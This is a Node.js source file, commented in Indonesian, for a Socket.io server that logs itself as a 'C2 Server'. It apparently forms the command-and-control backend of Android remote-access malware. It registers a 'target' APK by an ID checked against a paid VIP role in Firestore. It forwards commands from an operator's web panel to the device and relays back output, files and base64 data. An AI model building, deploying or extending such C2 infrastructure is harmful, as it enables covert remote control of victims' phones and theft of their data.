const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const admin = require('firebase-admin');
const cors = require('cors');

// === SERVICE ACCOUNT FIREBASE ===
// Nanti di Railway, masukin JSON ini ke Environment Variable "FIREBASE_SERVICE_ACCOUNT"
const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT || '{}');

if (serviceAccount.project_id) {
  admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}
const db = admin.firestore();

const app = express();
app.use(cors());
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// Simpan koneksi device yang aktif: Map<appuid, socketId>
const devices = new Map();
// Simpan koneksi panel yang aktif: Map<appuid, socketId>
const panels = new Map();

io.on('connection', (socket) => {
    console.log(`[WS] Client connected: ${socket.id}`);

    // 1. APK Target connect & handshake pake appuid
    socket.on('register_device', async (data) => {
        const { appuid, deviceInfo } = data;
        if (!appuid) return socket.disconnect();

        try {
            // Verifikasi appuid ke Firestore (harus VIP/Developer)
            const userSnap = await db.collection("users").doc(appuid).get();
            if (!userSnap.exists) {
                socket.emit('error_auth', 'Appuid not found');
                return socket.disconnect();
            }
            const user = userSnap.data();
            if (user.role !== 'vip' && user.role !== 'developer') {
                socket.emit('error_auth', 'Appuid not active (Not VIP)');
                return socket.disconnect();
            }

            devices.set(appuid, socket.id);
            await db.collection("devices").doc(appuid).set({
                online: true,
                lastSeen: admin.firestore.FieldValue.serverTimestamp(),
                deviceInfo: deviceInfo || {}
            }, { merge: true });

            console.log(`[+] Device registered: ${appuid}`);
            socket.emit('registered', { ok: true });

            // Kabarin panel kalau device online
            const panelSocket = panels.get(appuid);
            if (panelSocket) io.to(panelSocket).emit('device_status', { online: true });

        } catch (e) { console.error(e); }
    });

    // 2. Web Panel connect
    socket.on('register_panel', (data) => {
        const { appuid } = data;
        panels.set(appuid, socket.id);
        
        // Cek apakah device-nya lagi online
        const isOnline = devices.has(appuid);
        socket.emit('device_status', { online: isOnline });
    });

    // 3. Panel ngirim perintah
    socket.on('send_command', async (data) => {
        const { appuid, command, args } = data;
        const targetSocketId = devices.get(appuid);

        if (!targetSocketId) {
            return socket.emit('command_output', { type: "error", output: "Device offline" });
        }

        // Teruskan perintah ke APK target
        io.to(targetSocketId).emit('execute_command', { command, args });
        console.log(`[CMD] Sent to ${appuid}: ${command}`);
    });

    // 4. APK ngirim balik hasil perintah
    socket.on('command_output', (data) => {
        const { appuid, type, output, files, base64, info } = data;
        const panelSocket = panels.get(appuid);
        if (panelSocket) {
            io.to(panelSocket).emit('command_output', { type, output, files, base64, info });
        }
    });

    // 5. Disconnect handling
    socket.on('disconnect', async () => {
        // Cek apakah ini device
        for (let [appuid, sockId] of devices.entries()) {
            if (sockId === socket.id) {
                devices.delete(appuid);
                await db.collection("devices").doc(appuid).update({ online: false });
                console.log(`[-] Device disconnected: ${appuid}`);
                const panelSocket = panels.get(appuid);
                if (panelSocket) io.to(panelSocket).emit('device_status', { online: false });
                break;
            }
        }
        // Cek apakah ini panel
        for (let [appuid, sockId] of panels.entries()) {
            if (sockId === socket.id) {
                panels.delete(appuid);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => console.log(`C2 Server running on port ${PORT}`));
